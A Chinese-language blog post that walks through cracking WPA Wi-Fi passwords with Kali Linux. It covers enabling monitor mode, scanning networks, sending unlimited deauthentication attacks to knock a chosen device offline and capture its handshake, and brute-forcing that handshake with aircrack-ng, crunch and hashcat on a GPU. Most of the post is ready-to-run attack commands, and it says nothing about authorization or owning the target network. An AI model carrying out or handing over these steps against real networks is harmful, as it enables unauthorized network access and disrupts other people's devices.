---
date: "2026-01-13T00:00:00+08:00"
title: "使用 Kali Linux 破解 Wi-Fi 密码"
tags:
    - Kali
    - Wi-Fi
---
## 准备工作
需要准备一台有无线网卡且安装了 Kali Linux 系统的机器，如果使用虚拟机的方式安装，则需要一个兼容的外置无线网卡。

下面的命令都以超级管理员权限运行，如果是普通用户需要在命令前加上`sudo`。

## 查看无线网卡是否支持监控模式
使用`iw`命令
```shell
# 查看无线网卡支持的接口模式
iw list | grep -A 10 "Supported interface modes"

# 或者更详细地查看特定网卡
iw phy0 info  # phy0 是物理设备编号
```
如果输出中包含`* monitor`，则表示支持监控模式，可以继续往下，否则需要更换一张支持监控模式的无线网卡。

## 开启监控模式
先关闭一些可能会影响监控模式的进程：
```shell
airmon-ng check kill
```
然后运行下面的命令开启监控模式：
```shell
airmon-ng start wlan0
```
其中`wlan0`是无线网卡的标识，通过`ifconfig`可以查看。

成功之后，输入`ifconfig`或者`iwconfig`可以看到`wlan0`变成了`wlan0mon`。当然也可能有部分无线网卡不会变成`mon`后缀的名字，没关系，只要`iwconfig`中能看到`Mode: Monitor`字样的输出就说明开启了监控模式。

## 扫描附近无线网
```shell
airodump-ng wlan0mon
```
会输出附近 Wi-Fi 的信息，字段含义如下：
<div class="scroll-container">

| 字段名 | 含义 | 作用 |
| ----- | ----- | ----- |
| BSSID | 无线接入点的 MAC 地址。这是 AP 网卡唯一的物理地址标识符，相当于它的“身份证号” | 在后续的攻击或测试中（如解除认证攻击、捕获握手包），这是你指定的目标地址 |
| PWR | 信号强度。这个数值表示你的无线网卡接收到的来自该 AP 的信号电平 | 数值越接近 0（例如 -30），表示信号越强，距离越近或障碍物越少。数值越负（例如 -90），表示信号越弱。有时显示为 0，通常是因为网卡驱动不支持报告信号强度 |
| Beacons | 信标帧的数量 | AP 会定期（通常每秒 10 次）广播信标帧，来宣告自己的存在。这个数字会持续增长，可以用来判断 AP 是否稳定在线。数值本身意义不大，主要看其是否在持续增加 |
| #Data | 监听到的数据帧的数量（自从你开始扫描起）| 反映了网络的活跃程度 |
| #/s | 过去 10 秒钟内，平均每秒捕获的数据帧数量 | 实时反映网络活跃度的指标。#Data 是总量，#/s 是瞬时速率 |
| CH | AP 当前正在使用的无线信道 | 在进行监听或攻击时，你需要将你的无线网卡切换到与该 AP 相同的信道 |
| MB | AP 支持的最大连接速率和无线模式 | 数字代表最大速率（如 54 代表 54Mbps）。后缀字母代表模式 |
| ENC | 使用的加密算法 | OPN 表示开放网络，无加密；WEP 是已被破解的旧加密方式，安全性极低；WPA/WPA2/WPA3 是目前主流的安全加密协议，WPA2 最为常见，WPA3 则是最新的 |
| CIPHER | 加密协议内部使用的具体加密套件/算法 | CCMP 通常与 WPA2 配对，基于 AES 算法，是目前最安全的；TKIP 通常与 WPA 配对，较旧且存在漏洞，不如 CCMP 安全；WEP 与 ENC 字段的 WEP 对应 |
| AUTH | 认证方式或密钥管理方式 | PSK（预共享密钥）是家庭和小型办公室网络的典型方式，使用一个密码；MGT（企业级认证）使用独立的用户名和密码证书进行认证，安全性更高，个人无法通过破解密码接入；SKA 用于传统的 WEP 共享密钥认证，已很少见；OPN 与无加密配对 |
| ESSID | 无线网络的名称，也就是你在手机或电脑上搜索 WiFi 时看到的那个名字 | 有时会显示`<length: 0>`或为空，表示该 AP 隐藏了它的 ESSID（不广播名称），但这并不能真正隐藏网络，通过其他数据帧依然可以发现它 |
</div>

默认只扫描 2.4GHz 频段的无线信道，如果想要扫描 5GHz 的话可以使用`--channel <信道列表>`参数来指定。
```shell
airodump-ng --channel 36,40 wlan0mon
```
> By default, airodump-ng hops on 2.4GHz channels.

## 监听指定无线网
选择上面列表中想要监听的无线网，运行如下命令：
```shell
airodump-ng -c <信道> --bssid <路由器mac地址> -w <文件前缀> wlan0mon
```
对特定 MAC 地址的无线网进行监听，此时如果有设备连接上了该无线网（比如某个人带着手机回到家中自动连接上了无线），就会抓取握手包信息并写入用`-w`参数指定了前缀名称的文件中。

## 攻击设备
被动等待很多时候几乎不可能抓取到握手包，需要主动出击。

不要停止上一步的操作，单独开一个新窗口，使用命令
```shell
aireplay-ng --deauth 0 -a <路由器mac地址> -c <设备mac地址> wlan0mon
```
或者使用`mdk4`工具（需自行安装）
```shell
mdk4 wlan0mon d -B <路由器mac地址> -S <设备mac地址>
```
对连接无线网的指定设备进行不限次数的解除认证攻击，等待上一步`airodump-ng`命令的右上角出现`WPA handshake`字样表示设备被攻击下线并重新连接，握手包被我们获取到了，这时候可以把两个步骤中的操作都给停止掉。

## 握手包爆破
握手包文件名为`<文件前缀>-n.cap`，其中 n 是一个数字，用来防止当前目录下有同名文件。

因为采用了 ESSID 加盐的方式进行哈希，没办法使用彩虹表，只能慢慢算。

### 使用字典
```shell
aircrack-ng -w <密码字典路径> <捕获的握手包文件路径>
```
出现`KEY FOUND!`字样就说明破解成功，密码是后面方括号里的值。如果运行完还没破解出来，说明密码不在字典中，需要改用其他字典或者使用其他方式进行破解。

### 使用掩码
`aircrack-ng`本身不直接生成密码，但可以通过标准输入接收密码列表，可以配合密码生成工具（如`crunch`）来生成特定模式的密码。
```shell
crunch <最小长度> <最大长度> <字符集> | aircrack-ng -w - <捕获的握手包文件路径>
```

假设握手包文件为`handshake.cap`，要破解一个 8 位纯数字密码，命令如下：
```shell
crunch 8 8 0123456789 | aircrack-ng -w - handshake.cap
```

这个命令会让`aircrack-ng`尝试从 00000000 到 99999999 的所有一亿种组合。

### 显卡加速
上面的`aircrack-ng`使用 CPU 进行计算，速度相对来说比较慢，我们可以改用 [hashcat](https://hashcat.net/hashcat/) 工具，利用显卡加速破解。

我们可以通过设置会话名称的方式来对破解进度进行增量保存，这样哪怕中途不小心或者主动退出的情况下，后续依然可以指定同样的会话来恢复之前的破解进度并继续进行破解。

根据要求安装好 hashcat 程序和对应的驱动。比如我在 Windows 平台上使用 6600XT 显卡，就需要安装 [AMD HIP SDK](https://www.amd.com/zh-cn/developer/resources/rocm-hub/hip-sdk.html) 才可以。
> GPU Driver requirements:
> - AMD GPUs on Linux require "AMD Radeon Software for Linux" with "ROCm"
> - AMD GPUs on Windows require "AMD Adrenalin Edition" and "AMD HIP SDK"
> - Intel and AMD CPUs require "Intel CPU Runtime for OpenCL" or PoCL
> - Intel GPUs require "Intel Graphics Compute Runtime" aka NEO
> - NVIDIA GPUs require "NVIDIA CUDA Toolkit"

在[这个网站](https://hashcat.net/cap2hashcat/)中，将上面的`.cap`文件转换成`.hc22000`文件。

以 Windows 平台为例，运行命令
```powershell
.\hashcat.exe -m 22000 -a 3 -w 4 xxx.hc22000 ?d?d?d?d?d?d?d?d -i --increment-min=8 --increment-max=8 --session <会话名>
```
会尝试所有的 8 位纯数字密码来进行破解。这个遍历的过程是随机的，所以不用担心密码是 99999999 而需要从头运行到尾的情况。

`-a 3`指定攻击模式为`Brute-force`；`-w 4`会拉满显卡，让桌面应用出现明显卡顿，如果不希望这样可以设置成 1-3 之间的值。

运行过程中可以按`s`显示当前的状态，按`q`退出，后续可以通过命令
```powershell
.\hashcat.exe --session <会话名> --restore
```
从之前退出时的保存点继续往下运行。

经过测试，对于 8 位纯数字密码，我的 6600XT 显卡全部破解一遍大约需要 3 分钟，而我的 M1 pro 大约需要 16 分钟。